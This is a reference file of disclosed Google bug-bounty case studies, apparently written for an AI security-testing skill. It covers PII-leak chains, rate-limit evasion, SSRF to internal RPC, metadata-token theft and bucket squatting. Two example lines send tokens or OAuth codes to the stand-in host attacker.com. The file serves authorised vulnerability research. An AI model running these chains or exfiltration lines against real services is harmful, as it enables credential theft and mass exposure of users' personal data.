# Case studies — the six brutecat chains

Worked examples to calibrate "what critical looks like" and how the primitives combine. Format: setup → primitive(s) → chain → bounty → transferable lesson. Patterns referenced as P# map to `bug-patterns.md`.

---

## 1. Decoding Google — black box → white box (the foundation)
**Setup:** internal `-pa` / `clients6` APIs with no public docs.
**Primitives:** discovery documents (incl. internal `people-pa`), visibility labels (`&labels=PANTHEON` 214KB→329KB), req2proto/ProtoJson type-confusion (`[1,2,3,...]` with `application/json+protobuf` leaks the schema; `/youtubei/v1/browse` → 27 params), scope-from-error (`WWW-Authenticate`), the identity layer cake (API key, SAPISIDHASH, Android refresh→Bearer, `X-Goog-Spatula` with unvalidated DroidGuard).
**Lesson:** this isn't a bug, it's the **prerequisite**. Every chain below starts here. Build/keep your own `req2proto`, `gapi-service`, `aas-rs` equivalents.

## 2. YouTube creator email — $20,000
**Chain:** req2proto on `get_creator_channels` reveals hidden `includeSuspended`/`critical_read` **(P2)** → `includeSuspended:true` exposes `contentOwnerAssociation.externalContentOwnerId` (an IVP content-owner id) → Content ID API `contentOwners.list?id=<id>` (built for Content Managers but accepts IVP ids), queried via the privileged **API Explorer**, returns `conflictNotificationEmail` **(P3)**.
**Why it paid:** two individually-low features (hidden param + legacy API) chained to PII for ~3M monetized creators. Tier-1 domain multiplier (youtube.com + studio.youtube.com) added $6,663.
**Lesson:** hidden param → id → second service that resolves the id. Public "explorer" tools run with elevated service creds — abuse them as the resolver.

## 3. Leaking any YouTube user's email — ~$10,600
**Chain:** People-API staging docs show `BlockedTarget` references obfuscated Gaia ids → YouTube `live_chat/get_item_context_menu` (base64 protobuf params) returns a **target channel's Gaia id with no block needed** when you swap the channel id **(P2/IDOR)** → **Pixel Recorder** `WriteShareList` (`pixelrecorder-pa`) resolves `["uuid",null,[["<gaiaId>",2,null]]]` → email, **no ACL (P3)** → suppress the share notification with a ~2.5M-char recording title **(P9)**.
**Lesson:** the resolver lived in an unrelated, less-watched product (Pixel Recorder). Always ask "what *other* product accepts this id type?" Stealth matters — find the silent-failure in the alert path.

## 4. Leaking any Google user's phone — $5,000
**Chain:** disable JS → legacy username-recovery form still works → `usernamerecovery` + `/lookup` is an account-exists + phone-mask oracle → defeat rate-limit with **IPv6 /64 rotation** + **BotGuard token reuse** (token minted on JS form has no limit on No-JS form) **(P7)** → leak victim display name via Looker Studio ownership-transfer (0-interaction) → libphonenumber masks narrow the search → brute the masked digits at ~40k/sec (NL 15s, SG 5s, US 20min).
**Lesson:** disabling JS resurrects "modern" attack surface. Abuse tokens are context-portable. Pull hints from *other* services (PayPal reset masks) to shrink the space. **PoC on your own number only.**

## 5. StubZero — Google Cloud production RCE — $148,337
**Chain A ($60k):** `getProtoDefinition` = req2proto-as-a-service → `listQuotaQueue` leaks workflow queue + `client_id:"default"` → `createDraftWorkflow` with `GenericStubbyTypedTaskV2` **(P6)**, ACL approval bypassed via `auth:setAcl` to attacker Gaia id + **fix-propagation timing (P8)** → workflow runs arbitrary Stubby RPC as the platform's **prod service identity** = RCE.
**Chain B ($75k+$13,337):** public `TestCases/ListTestCases` leaks cross-tenant test cases when filter field omitted **(P4/cross-tenant)** → binary-search on `workflow_id` filter extracts victim UUID in ~128 reqs **(P5)** → cross-tenant integration IDOR `GET .../versions/<victim-uuid>` (auth checks attacker project only) **(P1)** → public API accepts `taskConfigsInternal` internal task types **(P6)**; test-case execution path reaches deeper backend, stack traces confirm `EventbusStubbyCallerService.ExecuteStubbyCall`. CVE-2026-2031.
**Lesson:** the highest payouts are **internal-task-in-public-API reaching a prod service identity**. Stack traces and execution logs are your white-box view into the backend. Two researchers' findings combined — one's blocker (ACL approval) was the other's solvable problem (LB timing).

## 6. Hacking Google with A.I. — $500,000 across 1,500+ APIs
**Setup:** 3,600+ API keys harvested (61k APK unpacks, DevTools traffic over 2,800 domains, IPA decryption); 1,500+ discovery docs.
**Method:** MCP tools — `probe_api()` fires the same request across **every** key, groups responses by hash (the odd-one-out has extra visibility); `report_vulnerability()` ties each finding to an **operation id** so nothing is hallucinated; `confirm_testing_complete()` gate (Ralph-Wiggum loop) stops early-exit. False-positive rules: enumeration ≠ bug; 500/401/403/404 ≠ bug; only **2xx with data you shouldn't see** counts.
**Sample findings:** Google Voice unauth `BssGetVoiceSettings?gaiaId=` (P0), AdExchange staging→prod cross-tenant admin-add, Widevine portal self-provision to any org, Translation Hub cross-tenant GCS exfil via shared Storage-Admin service account, Vertex AI Search config read/write (prompt injection).
**Lesson:** the edge is **scale + discipline**, not a single clever payload. Same probe × thousands of keys/labels, grouped by response hash, with a hard false-positive bar and evidence-linked reporting.

---

## The meta-pattern across all six
1. **Convert to white box first** (case 1) — non-negotiable prerequisite.
2. **Find a primitive** — a hidden param (P2), a leaked id (P1/P3), a comparison oracle (P5), an internal type in a public API (P6).
3. **Find the gap** — a *second* service or staging host that trusts the primitive without an ACL (P3/P4).
4. **Chain to impact** — any-user PII, cross-tenant read/write, or prod-identity RCE.
5. **Stay in bounds** — own-account PoC, suppress nothing real, report with evidence.

---

# Part B — disclosed public-report mini-cases (Bug Hunters corpus)

Real, dated, paid Google VRP reports from `bughunters.google.com/report/reports` — distilled to the transferable primitive. IDs link as `bughunters.google.com/reports/vrp/<id>`. Full index in `disclosed-corpus.md`.

## B1. Real-time Support API — global PII to any account — $14,337 (VBbY59QXh)
`realtimesupport.clients6.google.com/v2/changes:list` (a `google.internal.realtimesupport.v2.ChangeService2.ListChanges` RPC) is callable by **any** logged-in Google account via first-party `SAPISIDHASH`, and a 2-timestamp `timeRange` returns **global** data: agent names + `@google.com` emails + activity status, plus customer account names, phone numbers, and `cbfConversationId`. Run from the host's own tab (404s) to dodge CORS. → **P-new auth notes**: any-account first-party fronts + `list/changes` time-range RPCs dump cross-tenant.

## B2. Cross-tenant bucket squatting — $13,337 (HRDqQWSLs)
Application Design Center auto-creates `${project_id}-us-central1-adc` with no existence/ownership check. Pre-create it (you only need the victim's project_id), bind `allUsers→storage.admin`; when the victim enables ADC their Terraform artifacts land in **your** bucket → read secrets, **overwrite tfvars → RCE**. → **P10**.

## B3. Apps Script ACL divergence — $15,000 + $7,500 (7EhAw2hur, yBeFmSrJi)
Docs/Drive UI hides editor identities and the linked Form from non-editors. With only the fileId (from a public view link), server-side Apps Script returns them anyway: `DocumentApp.openById(id).getEditors()` → all editor emails ($15k); `SpreadsheetApp.openById(id).getFormUrl()` → linked Form to forge responses ($7.5k). → **P11**: open the same object through a client that doesn't share the UI's authz.

## B4. Cloud Deployment Manager — production RCE — $31,837 (jaNNXm8sg)
A Type Provider `descriptorUrl` pointed at `*.sandbox.googleapis.com` plus `inputMappings` injecting `Authorization: $.concat("Bearer ", $.googleOauth2AccessToken())` and `googleOptions{ gslbTarget:"blade:apphosting-admin-nightly", credentialType:"GAIAMINT", transport:"GSLB" }` turned a config field into an **SSRF into Google's internal RPC mesh with a minted internal identity**. Note the **`/deploymentmanager/staging_dogfood/…` path segment** (staging surface, weaker controls). → **P6/P12 + staging-path**.

## B5. GKE metadata protection downgrade → SA token — $5,000 (BrQZ18W5k)
With only `nodes: patch` (K8s) or `container.nodes.update` (IAM), relabel nodes to **disable Workload Identity Federation** (`iam.gke.io/gke-metadata-server-enabled=false`) and **enable legacy Metadata Concealment** (`cloud.google.com/metadata-proxy-ready=true`) — which does *not* block token reads — then pull the node SA token from `169.254.169.254`. → security control enforced by a flippable **label**; downgrade to the weaker mechanism. GKE Standard only (Autopilot's Warden blocks it).

## B6. Google Ads multi-RPC id chain — $5,000 (ZP6MgzwGr)
Bulk-Actions Scripts: `ScriptService/Preview` needs `dashboard_id` + an 8-digit `script_id` (brute-forceable) and returns a 20-digit `execution_id` → `ExecutionProgressService/GetIncrementalProgress` returns the victim's script output. → **P1 multi-RPC id-chaining**: the short guessable id mints the long unguessable one.

## B7. Auth bypass via unverified Firebase idToken — $1,337 (mjyKuWrfd)
`identitytoolkit.googleapis.com/v1/accounts:signUp` self-registers `jdoe@google.com`; the returned idToken has `email_verified:false`; `partner-companion.cloud.google` management APIs accept it as `Bearer` (signature valid) and leak feedback PII + admin notifications. → **Unverified-assertion trust** (auth modeling).

## B8. yum/dnf Artifact-Registry plugin token exfil (H7Cxz8j7j)
Plugin attached the SA OAuth token whenever `'pkg.dev' in url` (substring). A repo `baseurl=https://attacker.com/mirror-yum.pkg.dev/stable` exfiltrates a `cloud-platform`-scoped Bearer to the attacker — a stealthy **supply-chain** vector. → **P12 URL-allowlist bypass**.

## B9. Google Groups redacted-email reconstruction — $2,337 (MMNdrjKyr)
Member search `?q=email:abc*` returns HTML containing `class="LnLepd"` only when the prefix matches a real member → brute char-by-char to rebuild masked emails. → **P5 prefix/search oracle**.

## B10. Search Console client-side gate bypass — $3,133.70 (5XZmpiNfg)
A Full-permission (non-owner) user edits the `disabled=""` Continue button to `enabled=""` and bulk-exports a property's full unsampled performance data to **their own BigQuery** (and can stop others' exports) — access **persists after removal**. → **P13 client-side-only gating**.

## B11. Classic BOLA confirmations (lower $, fast to spot)
- `userByEmail(email)` GraphQL on a `*.run.app` Cloud Run backend returns any user's PII incl. Stripe id, no authz (TiNeBTPio). 
- POST `/api/v1/organisations/{orgId}/master-api-keys/` — swap `orgId` in the body → mint a master/Terraform API key in a **victim org** (ZFYGoLaHt, on a `terra-devel-*` staging host). 
- `androidenterprise.dev` (Salesforce) `ContentDocument` is API-enumerable → IDOR `/s/contentdocument/{id}` downloads every user's private uploads (mMS2XBwod). → **P1 + enumeration source**.

## B12. Auth/logic quickies (calibration — small bounties, trivial repro)
- OAuth code theft: a valid `redirect_uri` (the local appengine dev server) contained an **open redirect** (`/_ah/login?continue=`), so the code leaked to `attacker.com` via the Referer — find an open redirect *inside* an allowed origin when `redirect_uri` must match (F8GFYGv4g). 
- Email-parameter ATO: enter victim email + blank name → logged in as them (bt112fj1k). 
- Wrong-context nav: ignore the "switch account" prompt, click the product logo → land on an admin-only org dashboard (ftv2rpN3r).

---

# Part C — the capture-and-decode engine, worked end-to-end (Waze Map Editor)

**Waze Map Editor — reporter route + PII + payment-service mass disclosure — $11,337.** The canonical demonstration that this skill's engine (drive client → decode wire format → model authz → read/write asymmetry → data-subject amplification) is protocol-agnostic and works far outside the classic `-pa`/`clients6` Google surface. gRPC-web is just the format it happened to speak.

**Target:** `www.waze.com/*/editor` — a Google property (Waze), reachable at `www.waze.com/row-Descartes/grpc/com.waze.mapeditor.web.api.MapEditorWebServer/*`. Backend speaks **gRPC-web** (`application/grpc-web-text`).

**The chain, mapped to the engine:**

1. **Phase 1 — drive the real client** *(capture-and-decode.md Part 1)*. Sign into Waze with a plain, freshly-made account (zero editing history). Open the Map Editor, click the **"Review"** panel. The panel fires `searchMapUpdateRequests` — a call **no crawler triggers and no `.js` grep reveals as data**, only the authenticated UI interaction does.
2. **Phase 2 — decode the wire format** *(Part 3-A)*. The body is `grpc-web-text` = base64 → 5-byte-framed protobuf. Blackbox-decode it; reinterpret the 8-byte fields as **fixed64 doubles** → `f2 = {lon:-0.053779, lat:51.490745}` (11 cm precision), `f8 = {username:"HulkGirl90"}`, `f7 = comment`, `f16 = {timestamp, device_platform, language}`. One list query for a London-sized bbox = **500 records**.
3. **Phase 3 — model authz** *(whitebox-recon.md)*. `GET /api/user/get` on the account → `isEditor:false, areaManager:false, rank:0`. The UI itself says **"Reach Level 2 to manage update requests"** — the Solve / Not-identified **write** buttons are disabled. So writes are gated; the question becomes *is the read?*
4. **Phase 4 — read/write asymmetry** *(bug-patterns.md P14, run first)*. The gated write has a sibling **read**, `getMapUpdateRequest` (per-report detail). Called with the same zero-privilege account, it returns 2xx with the report's **full driven route** — `drive_geometry` + `route_geometry`, 60+ sequential `{lon,lat}` points — plus device (`CarPlay`), `Verified email`, a `Private` profile flag, nav prefs, and **`London ULEZ Compliant` / `TfL Auto Pay`** (toll/government payment-service enrollment). No gate on the read at all.
5. **Phase 5–6 — data-subject amplification** *(SKILL.md Impact amplification)*. The records belong to **ordinary drivers** who tapped "report a map issue" in the mobile app — *not* editors, never consented to this exposure. Single pin → full route (attributable movement pattern). One viewport → 500 records → **tileable globally**. That reasoning is what took it from "editor tool shows a pin" (P4) to **CVSS 8.7 authenticated mass-PII** (P1-class), $11,337.

**Transferable lessons:**
- The bug was **invisible** to anyone who didn't (a) drive the authenticated Review panel and (b) decode `grpc-web-text`. Both are pure engine steps — no cleverness, just refusal to skip the binary surface.
- **Read/write asymmetry is the fastest big win from a fresh account:** the app *told* the tester (via the disabled buttons) exactly which write was gated — the matching read was the bug.
- **Always open the detail read.** The list (`search*`) understated impact to a single GPS point; the detail (`get*`) carried the route + payment fields that set the severity.
- **This is not a Google-only technique.** Any authenticated SaaS with an editor/moderation/review/admin surface over gRPC-web / protobuf / GraphQL is the same hunt.

**Authorization note:** the report used *one* freshly-created own account, retained a sample of 5 usernames out of 500 (not the full list), and proved scale by count — textbook RoE. Replicate the *method* on in-scope targets; never replay this PoC against Waze.
